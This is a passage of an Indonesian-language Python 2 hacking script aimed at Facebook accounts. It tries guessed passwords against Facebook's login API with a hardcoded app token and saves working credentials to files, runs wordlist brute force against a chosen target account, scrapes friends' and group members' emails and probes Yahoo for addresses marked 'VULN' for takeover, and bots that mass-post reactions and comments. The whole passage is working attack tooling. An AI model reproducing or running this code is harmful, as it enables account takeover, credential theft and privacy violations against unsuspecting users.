								if 'www.facebook.com' in q["error_msg"]:
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									#Pass4
									lahir = b['birthday']
									pass4 = lahir.replace('/', '')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass4+" =>"+z['name'])
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											#Pass5
											pass5 = "sayang123","sayangku123"
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass5+" =>"+z['name'])
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													#Pass6
													pass6 = "bintang123","bintang12345"
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass6+" =>"+z['name'])
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															#Pass7
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = "sayang","doraemon","bintang","someone","bajingan","anjing","pukimak","playboy"
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass7+" =>"+z['name'])
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
                                                                                                                                else:
                                                                                                                                        #Pass8
                                                                                                                                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
                                                                                                                                         b = json.loads(a.text)
                                                                                                                                         pass8 = "januari","februari","maret123","april","mei123","juni123","juli123","agustus","september","november","desember"
                                                                                                                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                         q = json.load(data)
                                                                                                                                         if 'access_token' in q:
                                                                                                                                                 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                                                                                                                 z = json.loads(x.text)
                                                                                                                                                 print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass8+" =>"+z['name'])
                                                                                                                                                 oks.append(user+pass8)
                                                                                                                                         else:
                                                                                                                                                 if 'www.facebook.com' in q["error_msg"]:
                                                                                                                                                         cek = open("out/super_cp.txt", "a")
                                                                                                                                                         cek.write(user+"|"+pass8+"\n")
                                                                                                                                                         cek.close()
                                                                                                                                                         cekpoint.append(user+pass8)																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
	super()
######################################################

##### BRUTE FORCE #####
def brute():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	try:
		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
		total = open(passw,"r")
		total = total.readlines()
		print 42*"\033[1;97m═"
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("Brute.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					keluar()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("Brutecekpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					keluar()
			except requests.exceptions.ConnectionError:
				print"\033[1;91m[!] Tidak ada koneksi"
				time.sleep(0.01)
	except IOError:
		print ("\033[1;91m[!] File tidak ada")
		tanyaw()
def tanyaw():
	why = raw_input("\033[1;91m[?] \033[1;92mApakah ada ingin membuat wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
	if why =="":
		print "\033[1;91m[!] salah"
		tanyaw()
	elif why =="y":
		wordlist()
	elif why =="Y":
		wordlist()
	elif why =="n":
		menu_hack()
	elif why =="N":
		menu_hack()
	else:
		print "\033[1;91m[!] salah"
		tanyaw()
		
##### YAHOO CHECKER #####
#---------------------------------------------------#
def menu_yahoo():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;94m────────────────────────────────────────────────"
	print "\033[1;96m{\033[1;94m01\033[1;96m}\033[1;91m Clone daftar teman"
	print "\033[1;96m{\033[1;94m02\033[1;96m}\033[1;91m Clone daftar teman dari teman"
	print "\033[1;96m{\033[1;94m03\033[1;96m}\033[1;91m Clone dari member group"
	print "\033[1;96m{\033[1;94m04\033[1;96m}\033[1;91m Colne dari file"
	print "\033[1;96m{\033[1;94m03\033[1;96m}\033[1;92m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	yahoo_pilih()
#----pilih
def yahoo_pilih():
	go = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if go =="":
		print "\033[1;91m[!] salah"
		yahoo_pilih()
	elif go =="1":
		yahoofriends()
	elif go =="2":
		yahoofromfriends()
	elif go =="3":
		yahoomember()
	elif go =="4":
		yahoolist()
	elif go =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] salah"
		yahoo_pilih()
		
##### LIST FRIEND #####
def yahoofriends():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mMendapatkan email teman \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/MailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
	menu_yahoo()

##### CLONE FROM FRIEND #####
def yahoofromfriends():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	idt = raw_input("\033[1;91m[+] \033[1;92mMasukan ID Teman \033[1;91m: \033[1;97m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;91m[!] ID teman tidak ada"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mMendapatkan email dari teman \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/FriendMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FriendMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
	menu_yahoo()
	
##### YAHOO MEMBER #####
def yahoomember():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	id=raw_input('\033[1;91m[+] \033[1;92mMasukan ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] ID Group Tidak ada"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mMendapatkan email dari group \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/GrupMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
	menu_yahoo()
		
##### YAHOO FILE #####
def yahoolist():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	files = raw_input("\033[1;91m[+] \033[1;92mMasukan File \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;91m[!] File tidak ada"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu_yahoo()
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;97m═"
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
			        pek = jok.search(klik).group()
			except:
			        continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				save.write(mail + '\n')
				print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail)
				berhasil.append(mail)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
	menu_yahoo()
	

		
##### MENU BOT #####
#----------------------------------------#
def menu_bot():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;94m────────────────────────────────────────────────"
	print "\033[1;97m{\033[1;94m01\033[1;97m}\033[1;97m Bot React Post Target"
	print "\033[1;97m{\033[1;94m02\033[1;97m}\033[1;97m Bot React Grup Post"
	print "\033[1;97m{\033[1;94m03\033[1;97m}\033[1;97m Bot Komen Target Post"
	print "\033[1;97m{\033[1;94m04\033[1;97m}\033[1;97m Bot Komen Grup Post"
	print "\033[1;97m{\033[1;94m05\033[1;97m}\033[1;97m hapus postingan"
	print "\033[1;97m{\033[1;94m06\033[1;97m}\033[1;97m acc pertemanan"
	print "\033[1;97m{\033[1;94m07\033[1;97m}\033[1;97m hapus pertemanan"
	print "\033[1;97m{\033[1;94m00\033[1;97m}\033[1;97m keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	bot_pilih()
#////////////
def bot_pilih():
	bots = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if bots =="":
		print "\033[1;91m[!] salah"
		bot_pilih()
	elif bots =="1":
		menu_react()
	elif bots =="2":
		grup_react()
	elif bots =="3":
		bot_komen()
	elif bots =="4":
		grup_komen()
	elif bots =="5":
		deletepost()
	elif bots =="6":
		accept()
	elif bots =="7":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "\033[1;91m[!] salah"
		bot_pilih()
		
##### MENU REACT #####
def menu_react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;94m────────────────────────────────────────────────"
	print ("\033[1;91m{\033[1;94m01\033[1;91m} \033[1;97mLike")
	print ("\033[1;91m{\033[1;94m02\033[1;91m} \033[1;97mLove")
	print ("\033[1;91m{\033[1;94m03\033[1;91m} \033[1;97mWow")
	print ("\033[1;91m{\033[1;94m04\033[1;91m} \033[1;97mHaha")
	print ("\033[1;91m{\033[1;94m05\033[1;91m} \033[1;97mSadBoy")
	print ("\033[1;91m{\033[1;94m06\033[1;91m} \033[1;97mAngry")
	print "\033[1;91m{\033[1;94m00\033[1;91m} \033[1;97m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	react_pilih()
#//////////////
def react_pilih():
	global tipe
	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if aksi =="":
		print "\033[1;91m[!] Salah"
		react_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		react()
	elif aksi =="2":
		tipe = "LOVE"
		react()
	elif aksi =="3":
		tipe = "WOW"
		react()
	elif aksi =="4":
		tipe = "HAHA"
		react()
	elif aksi =="5":
		tipe = "SAD"
		react()
	elif aksi =="6":
		tipe = "ANGRY"
		react()
	elif aksi =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Salah"
		react_pilih()
#####NEXT
def react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mMasukan ID Target \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		oh = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksi.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksi))
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID tidak ada"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu_bot()
		
##### BOT REACT GRUP #####
def grup_react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;94m────────────────────────────────────────────────"
	print ("\033[1;91m{\033[1;94m01\033[1;91m} \033[1;97mLike")
	print ("\033[1;91m{\033[1;94m02\033[1;91m} \033[1;97mLove")
	print ("\033[1;91m{\033[1;94m03\033[1;91m} \033[1;97mWow")
	print ("\033[1;91m{\033[1;94m04\033[1;91m} \033[1;97mHaha")
	print ("\033[1;91m{\033[1;94m05\033[1;91m} \033[1;97mSadBoy")
	print ("\033[1;91m{\033[1;94m06\033[1;91m} \033[1;97mAngry")
	print "\033[1;91m{\033[1;94m00\033[1;91m} \033[1;97m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	reactg_pilih()
#//////////////
def reactg_pilih():
	global tipe
	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if aksi =="":
		print "\033[1;91m[!] Salah"
		reactg_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		reactg()
	elif aksi =="2":
		tipe = "LOVE"
		reactg()
	elif aksi =="3":
		tipe = "WOW"
		reactg()
	elif aksi =="4":
		tipe = "HAHA"
		reactg()
	elif aksi =="5":
		tipe = "SAD"
		reactg()
	elif aksi =="6":
		tipe = "ANGRY"
		reactg()
	elif aksi =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Salah"
		reactg_pilih()
#####NEXT
def reactg():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mMasukan ID Group \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] ID Group tidak ada"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		grup_react()
	try:
		oh = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksigrup.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksigrup))
		raw_input("\n\033[1;91m[ \033[1;97mkKeluar \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID tidak aka"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu_bot()
	
##### BOT KOMEN #####
def bot_komen():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[!] \033[1;93mGunakan \033[1;97m'<>' \033[1;92muntuk baris baru"
	ide = raw_input('\033[1;91m[+] \033[1;92mID  \033[1;91m: \033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComent \033[1;91m: \033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m: \033[1;97m ")
	km=km.replace('<>','\n')
	try:
		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			komen.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komen))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91mTidak ada"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar\033[1;91m]")
		menu_bot()

##### BOT KOMEN GRUP #####
def grup_komen():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[!] \033[1;92mGunakan \033[1;97m'<>' \033[1;92muntuk baris baru"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Group  \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	try:
		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			komengrup.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komengrup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
		
##### HAPUS POST #####
def deletepost():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
